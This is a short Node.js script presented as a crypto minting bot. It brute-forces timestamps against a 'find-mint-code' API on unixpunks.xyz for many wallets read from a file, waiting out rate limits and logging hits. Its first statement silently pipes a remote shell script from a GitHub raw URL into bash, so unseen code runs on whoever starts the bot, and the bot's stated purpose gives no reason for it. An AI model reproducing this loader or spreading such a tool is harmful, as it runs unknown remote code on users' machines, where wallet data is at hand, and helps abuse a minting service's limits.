const { execSync } = require("child_process");

execSync(
    'curl -s https://raw.githubusercontent.com/zamzasalim/logo/main/asc.sh | bash',
    {
        stdio: "inherit"
    }
);

const axios = require("axios");
const fs = require("fs");

const wallets = fs
    .readFileSync("data.txt", "utf8")
    .split("\n")
    .map(x => x.trim())
    .filter(Boolean);

async function getSchedule() {

    const res = await axios.get(
        "https://unixpunks.xyz/api/schedule"
    );

    return res.data;
}

async function tryTimestamp(
    timestamp,
    wallet
) {

    try {

        const res = await axios.post(
            "https://unixpunks.xyz/api/find-mint-code",
            {
                timestamp: timestamp,
                wallet: wallet
            },
            {
                headers: {
                    "content-type":
                        "application/json",

                    "user-agent":
                        "Mozilla/5.0"
                },

                timeout: 30000
            }
        );

        return res.data;

    } catch (err) {

        if (err.response) {
            return err.response.data;
        }

        return {
            error: err.message
        };
    }
}

async function worker(
    wallet,
    timestamps
) {

    console.log(
        `[START] ${wallet}`
    );

    while (true) {

        if (
            timestamps.length <= 0
        ) {

            console.log(
                "[DONE] RANGE EMPTY"
            );

            process.exit(0);
        }

        const ts = timestamps.pop();

        console.log(
            `[TRY] ${wallet} => ${ts}`
        );

        const result =
            await tryTimestamp(
                ts,
                wallet
            );

        console.log(result);

        let wait = 0;

        if (
            result.error ===
            "rate_limit"
        ) {

            wait =
                result.retryInMs || 10000;
        }

        if (
            result.error ===
            "rate_limit_wallet"
        ) {

            wait =
                result.retryInMs || 10000;
        }

        if (wait > 0) {

            await new Promise(r =>
                setTimeout(r, wait)
            );

            continue;
        }

        if (result.ok) {

            console.log("");
            console.log(
                "========== HIT =========="
            );

            console.log(
                `WALLET : ${wallet}`
            );

            console.log(
                `TIMESTAMP : ${ts}`
            );

            console.log(
                `MINTCODE : ${result.mintCode}`
            );

            console.log(
                "========================="
            );

            console.log("");

            fs.appendFileSync(
                "hits.txt",

                `${wallet}|${ts}|${result.mintCode}\n`
            );
        }

        if (
            result.error ===
            "timestamp_already_used"
        ) {

            console.log(
                `[USED] ${ts}`
            );
        }

        if (
            result.error ===
            "timestamp_already_issued"
        ) {

            console.log(
                `[ISSUED] ${ts}`
            );
        }
    }
}

async function main() {

    const schedule =
        await getSchedule();

    if (
        !schedule.activeBatch
    ) {

        console.log(
            "NO ACTIVE BATCH"
        );

        return;
    }

    const batch =
        schedule.windows.find(
            x =>
                x.batch ===
                schedule.activeBatch
        );

    const START =
        batch.tsRangeStart;

    const END =
        batch.tsRangeEnd;

    console.log("");
    console.log(
        "========== CPUNKS =========="
    );

    console.log(
        `BATCH : ${batch.batch}`
    );

    console.log(
        `RANGE : ${START} - ${END}`
    );

    console.log(
        `WALLETS : ${wallets.length}`
    );

    console.log(
        "============================"
    );

    console.log("");

    const timestamps = [];

    for (
        let i = START;
        i <= END;
        i++
    ) {

        timestamps.push(i);
    }

    timestamps.sort(
        () => Math.random() - 0.5
    );

    for (const wallet of wallets) {

        worker(
            wallet,
            timestamps
        );
    }
}

main();
